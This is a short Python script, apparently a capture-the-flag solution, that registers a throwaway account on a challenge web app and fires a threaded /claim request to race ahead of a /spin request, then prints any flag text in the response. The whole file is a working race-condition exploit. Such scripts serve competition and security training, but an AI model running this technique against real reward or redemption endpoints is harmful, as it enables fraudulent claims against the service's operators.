import requests, threading, time, random, string

base = 'https://web-random-cheese.tracebash.xyz'

# Race condition: claim before spins complete
s = requests.Session()
name = ''.join(random.choices(string.ascii_lowercase, k=8))
s.post(f'{base}/register', data={'username': name, 'password': name})
s.post(f'{base}/login', data={'username': name, 'password': name})

flag_result = []
def do_claim():
    r = s.post(f'{base}/claim')
    flag_result.append(r.text.encode('utf-8', errors='ignore'))

t = threading.Thread(target=do_claim)
t.start()
time.sleep(0.001)
s.post(f'{base}/spin')  # start a spin but claim races ahead
t.join()

# Print the raw bytes looking for CTF pattern
for line in flag_result[0].split(b'\n'):
    if b'CTF' in line or b'flag' in line.lower() or b'congratulations' in line.lower():
        print(line.decode('utf-8', errors='replace'))

print('\n--- Raw output ---')
print(flag_result[0].decode('utf-8', errors='replace')[:2000])